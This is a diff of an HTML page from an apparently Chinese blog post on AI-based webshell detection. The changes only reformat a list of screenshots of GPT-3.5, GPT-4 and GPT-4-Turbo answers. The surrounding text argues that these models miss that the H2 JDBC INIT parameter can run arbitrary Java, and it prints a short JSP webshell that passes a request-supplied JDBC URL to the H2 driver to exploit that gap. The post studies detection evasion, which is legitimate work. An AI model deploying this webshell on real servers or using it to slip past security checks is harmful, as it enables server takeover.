@@ -372,17 +372,16 @@
 
 <p> 的几个模型的回答：</p>
 <ul>
-<li>GPT-3.5</li>
+<li><p>GPT-3.5</p>
+<p>  <img src="/img/aiWebshell/bd2b9ef5-2213-42d7-8c41-f5ee7990f2b5.png"></p>
+</li>
+<li><p>GPT-4</p>
+<p>  <img src="/img/aiWebshell/825c8592-e7d8-4063-8ffa-068af3ea50bd.png"></p>
+</li>
+<li><p>GPT-4-Turbo</p>
+<p>  <img src="/img/aiWebshell/a95f6cae-c6a4-4d7f-b3c0-11da97978c72.png"></p>
+</li>
 </ul>
-<p> <img src="/img/aiWebshell/bd2b9ef5-2213-42d7-8c41-f5ee7990f2b5.png"></p>
-<ul>
-<li>GPT-4</li>
-</ul>
-<p> <img src="/img/aiWebshell/825c8592-e7d8-4063-8ffa-068af3ea50bd.png"></p>
-<ul>
-<li>GPT-4-Turbo</li>
-</ul>
-<p> <img src="/img/aiWebshell/a95f6cae-c6a4-4d7f-b3c0-11da97978c72.png"></p>
 <p> 可以看到随着模型的进步，程序给出的信息会更加的全面和详细。但就关键指标来说，虽然GPT-4的两个模型列出了INIT参数，但它们均只认为该参数可以执行SQL脚本，并未给出可以执行任意Java代码的提示。因此如果一个环境中存在H2 JDBC依赖，就可以尝试使用相关的WebShell进行绕过，样本如下：</p>
  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.sql.DriverManager&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    Class.forName(<span class="string">&quot;org.h2.Driver&quot;</span>);</span><br><span class="line">    DriverManager.getConnection(request.getParameter(<span class="string">&quot;url&quot;</span>));</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
 
